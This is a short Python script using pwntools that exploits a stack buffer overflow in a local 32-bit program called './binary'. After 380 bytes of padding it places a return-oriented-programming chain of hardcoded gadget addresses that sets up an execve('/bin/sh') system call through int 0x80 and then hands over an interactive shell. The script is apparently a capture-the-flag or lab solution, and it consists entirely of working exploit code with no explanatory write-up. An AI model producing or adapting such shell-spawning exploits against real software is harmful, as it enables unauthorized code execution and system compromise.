from pwn import *

elf = ELF('./binary')
p = process('./binary')

offset = 380                 
bin_sh_addr = 0x0804a008     

pop_eax = 0x80491f9
pop_ebx = 0x8049022
pop_ecx = 0x80491fd
pop_edx = 0x80491ff
int_80 = 0x8049201

print("[*] Constructing ROP chain...")
payload = b'A' * offset    

payload += p32(pop_eax)      # pop eax; ret
payload += p32(0xb)          # eax = 11 (execve syscall number)
payload += p32(pop_ebx)      # pop ebx; ret
payload += p32(bin_sh_addr)  # ebx = address of "/bin/sh"
payload += p32(pop_ecx)      # pop ecx; ret
payload += p32(0)            # ecx = NULL
payload += p32(pop_edx)      # pop edx; ret
payload += p32(0)            # edx = NULL
payload += p32(int_80)       # int 0x80 (syscall)

print(f"[*] Payload length: {len(payload)} bytes")
print("[*] Sending payload...")

p.sendline(payload)
p.interactive()